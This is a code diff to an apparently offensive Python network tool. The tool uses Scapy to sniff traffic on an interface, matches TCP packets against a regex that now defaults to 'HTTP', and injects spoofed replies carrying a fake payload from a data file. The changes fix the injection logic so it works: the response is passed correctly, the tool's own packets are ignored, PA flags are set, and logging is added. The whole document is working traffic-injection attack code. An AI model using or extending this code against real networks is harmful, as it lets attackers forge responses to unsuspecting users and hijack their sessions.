@@ -20,22 +20,22 @@ def inject_main(interface, regexp, datafile, exp):
 	sniff(
 		iface=interface,
 		filter=exp,
-		prn=lambda packet: _process_packet(packet, regex_engine, exp)
+		prn=lambda packet: _process_packet(packet, regex_engine, response)
 		)
 
 def _process_packet(packet, regex_engine, response):
-	if(_is_target_packet(packet, regex_engine)):
+	if(_is_target_packet(packet, regex_engine, response)):
 		_inject_reply(packet, response)
 
-def _is_target_packet(packet, regex_engine):
+def _is_target_packet(packet, regex_engine, response):
 	#Apply the regex matching to the packet only if it is tcp
 	try:
-		return re.search(regex_engine, packet[TCP][Raw].load)
+		return re.search(regex_engine, packet[TCP][Raw].load) != None and packet[TCP][Raw].load != response
 	except:
 		return False
 
 def _inject_reply(packet, response_payload):
-	print("%s\n%s\n" % (packet[IP].src, packet[TCP][Raw].load))
+	print("Detected a request from: %s" % (packet[IP].src))
 	loaded_response =  Ether(
 		src		=	packet[Ether].dst,
 		dst 	=	packet[Ether].src
@@ -48,10 +48,11 @@ def _inject_reply(packet, response_payload):
 		dport	=	packet[TCP].sport,
 		ack 	= 	packet[TCP].seq + len(packet[TCP][Raw].load),
 		seq 	= 	packet[TCP].ack,
-		) / response_payload
-
+		flags	=	"PA"
+		) / Raw(load = response_payload)
+	print("Sending a spoofed reply to: %s" % (loaded_response[IP].dst))
 	sendp(loaded_response)
-
+	#print("%s\n%s\n%s\n" % (response_payload, loaded_response[IP].src, loaded_response[TCP][Raw].load))
 
 
 
@@ -59,7 +60,7 @@ if __name__ == "__main__":
 	parser = argparse.ArgumentParser()
 	parser.add_argument("-i", "--interface", default="eth0",
 		help="Target Network interface to intercept traffic")
-	parser.add_argument("-r", "--regexp", default=".*",
+	parser.add_argument("-r", "--regexp", default="HTTP",
 		help="A regular expression to filter out packets")
 	parser.add_argument("-d", "--datafile", default="data/examples/payload.data",
 		help="The fake payload to be injected as response")
